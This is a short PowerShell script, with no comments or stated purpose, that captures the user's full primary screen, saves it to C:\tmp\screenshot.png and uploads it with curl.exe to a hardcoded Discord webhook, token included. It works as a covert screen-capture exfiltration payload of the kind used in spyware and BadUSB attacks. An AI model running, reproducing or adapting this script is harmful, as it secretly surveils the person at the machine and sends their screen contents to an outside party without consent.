Add-Type -AssemblyName System.Drawing
$webhook='https://discordapp.com/api/webhooks/1302747825582641256/108p5fkUlIipyNqOD8zmUXhZmWmkxmdxNZu25CuR-ZMoe0ZqP_CIn_HGz9ZstqDXdQUQ'
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bitmap.Save('C:\tmp\screenshot.png')
curl.exe -F 'file1=@C:\tmp\screenshot.png' $webhook
$graphics.Dispose()
$bitmap.Dispose()
